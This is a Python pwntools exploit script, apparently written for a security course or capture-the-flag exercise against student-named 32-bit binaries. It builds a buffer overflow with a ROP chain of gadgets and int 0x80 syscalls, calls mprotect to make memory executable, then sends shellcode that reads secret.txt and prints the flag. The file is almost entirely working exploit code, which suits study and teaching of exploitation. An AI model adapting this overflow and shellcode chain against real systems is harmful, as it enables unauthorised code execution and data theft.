import os
from pwn import *

IP = "0.0.0.0"
PORT = 0

file_secret = "secret.txt"
# file_binary = "10101_YAKOBCHUK_Dmytro_32"
# file_binary = "10126_ZELENIN_Vladyslav_32"
file_binary = "10122_STOKOP_Sofia_32"
file_breakpoints = "breaks32.gdb"

# GADGETS
pop_eax = p32(0x80b0fca)  # pop eax; ret
pop_ebx = p32(0x8065bbb)  # pop ebx; ret
mov_ecx_eax___mov_eax_ecx = p32(0x8094018)  # mov ecx, eax; mov eax, ecx; ret
pop_edx___pop_ebx = p32(0x8058739)  # pop edx; pop ebx; ret
syscall = p32(0x8071a90)  # int 0x80; ret
ret = p32(0x8071a92)  # ret


def run_local(debug = True, wsl2 = True):
    binary = ELF(f"./{file_binary}")
    context.arch = "i386"
    context.aslr = False  # True for cyclic(), False for clean run

    p = process([f"./{file_binary}"], env = {})
    pid = util.proc.pidof(p)[0]
    if debug == False:
        return p

    if wsl2 == False:  # Debug in Linux
        log.info(f"Waiting for GDB...\n"
                 f"$ gdb -q -p {pid}")
        pause()
        return p

    # Debug in WSL2
    gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
    log.debug(f"Gdb uses breakpoints from {file_breakpoints}")

    new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
    wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
    cmd = f"cmd.exe /c start {new_tab} {wsl}"
    os.system(cmd)
    util.proc.wait_for_debugger(pid)
    return p


def find_bad_bytes(buf, bad_bytes = None):
    if bad_bytes is None:
        bad_bytes = [
            0xa,  # 0xa = 10 = "\n", gets() takes all the chars up to "\n"
        ]
    found = False
    for i, byte in enumerate(buf):
        if byte in bad_bytes:
            log.warn(f"Bad byte '{hex(byte)}' at {i}")
            found = True
    if found:
        print(hexdump(buf, highlight = bad_bytes))
        log.error("Found bad bytes in a buffer!")


# SET REGISTER
def set_eax(value):
    buf = b""
    buf += pop_eax
    buf += p32(value)
    return buf


def set_ebx(value):
    buf = b""
    buf += pop_ebx
    buf += p32(value)
    return buf


def set_ecx(value):  # Use before set_eax()
    buf = b""
    buf += pop_eax
    buf += p32(value)
    buf += mov_ecx_eax___mov_eax_ecx
    return buf


def set_edx(value):  # Use before set_ebx()
    buf = b""
    buf += pop_edx___pop_ebx
    buf += p32(value)
    buf += p32(0)
    return buf


# CALL FUNCTION
def sys_mprotect(address, length, protection):
    num_mprotect = 125
    buf = b""

    buf += set_edx(protection)
    buf += set_ecx(length)
    buf += set_ebx(address)

    buf += set_eax(num_mprotect)
    buf += syscall
    return buf


def sys_read(fd, address, length):
    num_read = 3
    buf = b""

    buf += set_edx(length)
    buf += set_ecx(address)
    buf += set_ebx(fd)

    buf += set_eax(num_read)
    buf += syscall
    return buf


def main():
    sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))

    # Buffer overflow (with ret chain)
    buf = b"A" * 973  # eax before "cmp eax, 0x539"
    buf += p32(1337)
    buf += ret * 200

    # mprotect(): make RWX buffer for shellcode
    rwx_addr = 0x8048000
    rwx_length = 1 * 0x1000  # Should be multiple of 0x1000 = 4096 bytes = 1 RAM page
    rwx_mode = 7  # 7 = read | write | execute = RWX
    buf += sys_mprotect(rwx_addr, rwx_length, rwx_mode)

    # read(): read shellcode from STDIN & write it to RWX buffer
    stdin_fd = 0
    buf += sys_read(stdin_fd, rwx_addr, len(sc))

    buf += p32(rwx_addr)  # Jump to shellcode
    buf = buf.ljust(4873, b"B")  # ecx after "pop ecx"
    buf += p32(0xffffd000)
    # buf += p32(0xdddddddd)
    find_bad_bytes(buf)

    # RUN PROCESS
    buf = cyclic(5000)
    p = run_local(debug = True, wsl2 = True)
    # p = remote(IP, PORT)

    log.info("=== buffer")
    print(hexdump(buf))
    p.readline()
    p.writeline(buf)
    p.readuntil(b"GRANTED!")

    # pause()
    log.info("=== shellcode")
    print(hexdump(sc))
    p.writeline(sc)
    flag = p.readall().strip().decode()
    log.success(f"FLAG = {flag}")


if __name__ == "__main__":
    main()
